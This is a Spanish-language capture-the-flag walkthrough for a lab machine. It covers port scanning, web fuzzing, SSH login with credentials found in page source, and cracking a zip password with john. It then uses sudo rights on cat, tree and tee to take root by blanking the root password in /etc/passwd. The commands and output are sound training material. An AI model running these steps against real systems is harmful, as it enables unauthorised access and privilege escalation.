# Enumeracion de Puertos, Servicios y Versiones

```ruby
nmap -Pn -n -sS -p- --open -sCV --min-rate 5000 172.18.0.2 -oN nmap
```
```css
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-05 16:07 -03
Nmap scan report for 172.18.0.2
Host is up (0.0000050s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd
|_http-title: Leeme
|_http-server-header: Apache
8899/tcp open  ssh     OpenSSH 6.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a3:b0:db:99:e4:c6:a5:b2:5d:2b:36:b6:3e:d0:15:00 (ECDSA)
|_  256 8f:26:4e:8c:60:28:5c:14:03:b2:45:22:ae:e1:f9:24 (ED25519)
MAC Address: 02:42:AC:12:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.39 seconds

```

al chequear el servicio web me consigo con lo siguiente:

![Screenshot From 2024-11-05 16-09-56](https://github.com/user-attachments/assets/1748c3bb-6e4a-48b1-804b-47c86738560a)

si accedo al link que dejan en la web me lleva a una descarga a traves de Mega, por ahora realizare fuzzing web

# Fuzzing Web

```ruby
feroxbuster -u http://172.18.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -s 200,301,302 -x txt,php,bak,db,py,html,js,jpg,png -t 200 -d 10 --random-agent
```
```css
                                                                                                                                                                        
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://172.18.0.2
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 👌  Status Codes          │ [200, 301, 302]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ Random
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [txt, php, bak, db, py, html, js, jpg, png]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 10
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        7l       20w      233c http://172.18.0.2/images => http://172.18.0.2/images/
200      GET        6l     2650w   191334c http://172.18.0.2/css/bootstrap4-wizardry.min.css
200      GET     1493l     2509w    80197c http://172.18.0.2/images/bg-wizardry.jpg
200      GET     8701l    23141w   242664c http://172.18.0.2/css/bootstrap4-wizardry.css
200      GET     5201l     9756w   295766c http://172.18.0.2/images/bg-wizardry@2x.jpg
200      GET      105l      427w     4655c http://172.18.0.2/index.html
200      GET      248l      631w    10232c http://172.18.0.2/form.html
200      GET      264l      604w     7989c http://172.18.0.2/app.html
200      GET      105l      427w     4655c http://172.18.0.2/
301      GET        7l       20w      230c http://172.18.0.2/css => http://172.18.0.2/css/
200      GET       46l      184w     1558c http://172.18.0.2/shell.php
```

en un principio me llama la atencion `http://172.18.0.2/shell.php` asi que accedo a el y se observa lo siguiente:


![Screenshot From 2024-11-05 16-14-56](https://github.com/user-attachments/assets/0cc01181-a750-4d45-bcb5-6822441309b5)


continuo revisando y en el codigo fuente de http://172.18.0.2/form.html me consigo lo que parecen podrian ser credenciales

![Screenshot From 2024-11-05 16-20-43](https://github.com/user-attachments/assets/1109dae4-2161-460b-92a6-5ff9376d8d3e)

asi que pruebo lo podrian ser credenciales en el servicio ssh

```ruby
ssh rosa@172.18.0.2 -p 8899
```
```css
The authenticity of host '[172.18.0.2]:8899 ([172.18.0.2]:8899)' can't be established.
ED25519 key fingerprint is SHA256:cAzGwxFNFaiSQunDgfdHmtfdku3N1QR54OTRKR83fyw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[172.18.0.2]:8899' (ED25519) to the list of known hosts.
rosa@172.18.0.2's password: 
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.11.2-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Sun Jun  9 03:20:54 2024 from 172.23.0.1
rosa@da46575086db:~$ 
```

he logrado el acceso al sistema

# Escalada de Privilegios

### Rosa

chequeo los usuarios del sistema

```ruby
rosa@da46575086db:~$ cat /etc/passwd |grep -E "bash|sh"
```
```css
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
juan:x:1001:1001:,,,:/home/juan:/bin/bash
carlos:x:1002:1002:,,,:/home/carlos:/bin/bash
rosa:x:1003:1003:,,,:/home/rosa:/bin/bash
```
existen 3 usuarios: `rosa`, `carlos` y `juan` pero no tengo acceso al directorio de ninguno de los demas usuarios, asi que al irme al directorio del usuario
rosa, me consigo lo siguiente:

``` ruby
rosa@da46575086db:~$ cd ~
rosa@da46575086db:~$ ls
-
rosa@da46575086db:~$ cd ./-
rosa@da46575086db:~/-$ ls
backup_rosa.zip  irresponsable.txt
rosa@da46575086db:~/-$ cat irresponsable.txt 
Hola rosa soy juan como ya conocemos tus irresposabilidades de otras empresas te voy a dejar mi contraseña en un fichero .zip, captúralo para no volver a ser despedida.
Con cariño pero nos pones a todos en riesgo.
Seguro no trabajaste tambien en Decathlon ....
Un poco de acoso laboral......
rosa@da46575086db:~/-$
```
al intentar descomprimir el archivo .zip me solicita password asi que intentare crackear la password por lo que me lo envio a mi equipo...
desde mi maquina atacante:

```ruby
scp -P 8899 rosa@172.18.0.2:/home/rosa/-/backup_rosa.zip .

The authenticity of host '[172.18.0.2]:8899 ([172.18.0.2]:8899)' can't be established.
ED25519 key fingerprint is SHA256:cAzGwxFNFaiSQunDgfdHmtfdku3N1QR54OTRKR83fyw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[172.18.0.2]:8899' (ED25519) to the list of known hosts.
rosa@172.18.0.2's password: 
backup_rosa.zip                                                                                                                       100%  215   288.2KB/s   00:00    
```

extraigo el hash

```ruby
zip2john backup_rosa.zip > ziphash
```
e intento crackearlo con john

```ruby
john --wordlist=/home/darks/Desktop/linux/Kali/diccionarios/rockyou.txt ziphash
```
```css
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
123123           (backup_rosa.zip/password.txt)     
1g 0:00:00:00 DONE (2024-11-05 16:36) 33.33g/s 546133p/s 546133c/s 546133C/s 123456..cowgirlup
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

y descomprimo el archo para luego obtener la password del siguiente usuario

```ruby
7z x backup_rosa.zip

7-Zip 24.08 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-08-11
 64-bit locale=C.UTF-8 Threads:8 OPEN_MAX:1024

Scanning the drive for archives:
1 file, 215 bytes (1 KiB)

Extracting archive: backup_rosa.zip
--
Path = backup_rosa.zip
Type = zip
Physical Size = 215

    
Enter password (will not be echoed):
Everything is Ok

Size:       13
Compressed: 215

cat password.txt                      
hackwhitbash
```
ya obtenida la password cambio al usuario juan

### Juan

```ruby
sudo -l
```
```css
Matching Defaults entries for juan on da46575086db:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User juan may run the following commands on da46575086db:
    (carlos) NOPASSWD: /usr/bin/tree
    (carlos) NOPASSWD: /usr/bin/cat
```
puedo ejecutar 2 binarios como el usuario `carlos`, por un lado con `/usr/bin/tree` puedo listar el contenido de directorios, por lo que con este bianrio
podra chequear el directorio del usuario `carlos`, y por otro lado puedo ejecutar el binario `/usr/bin/cat` que si existe un archivo en el directorio del
usuario `carlos` lo podre leer

```ruby
sudo -u carlos /usr/bin/tree /home/carlos/
```
```css
/home/carlos/
└── password

1 directory, 1 file

```

aqui puedo ver que existe un archivo llamado password en el directorio del usuario `carlos` asi que ahora lo puedo leer con el binario `/usr/bin/cat`

```ruby
sudo -u carlos /usr/bin/cat /home/carlos/password
chocolateado
```

y obtengo la password del usuario `carlos` por lo que escalo a `carlos`

```ruby
su carlos
Password:
```

### carlos

ahora chequeo los binarios que podria usar como root

```ruby
sudo -l
```
```css
[sudo] password for carlos: 
Matching Defaults entries for carlos on da46575086db:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User carlos may run the following commands on da46575086db:
    (ALL : NOPASSWD) /usr/bin/tee
```
para escalar a `root`, lo que hare primero sera copiar a un archivo el contenido de `/etc/passwd`

```ruby
cat /etc/passwd > escalada
```
ahora modifico la primero linea del archivo `escalada` quedando : `root::0:0:root:/root:/bin/bash` y procedo a usar el binario `/usr/bin/tee` para
modificar el archivo `/etc/passwd`

```ruby
cat escalada | sudo tee /etc/passwd
```
```css
root::0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:101::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:996:996:systemd Resolver:/:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
juan:x:1001:1001:,,,:/home/juan:/bin/bash
carlos:x:1002:1002:,,,:/home/carlos:/bin/bash
rosa:x:1003:1003:,,,:/home/rosa:/bin/bash
```
valido el cambio en `/etc/passwd`

```ruby
cat /etc/passwd |grep root

root::0:0:root:/root:/bin/bash
```
el cambio se realizo correctamente asi que procedo a la escalada

```ruby
su root
```

### root

```css
id
uid=0(root) gid=0(root) groups=0(root)
```
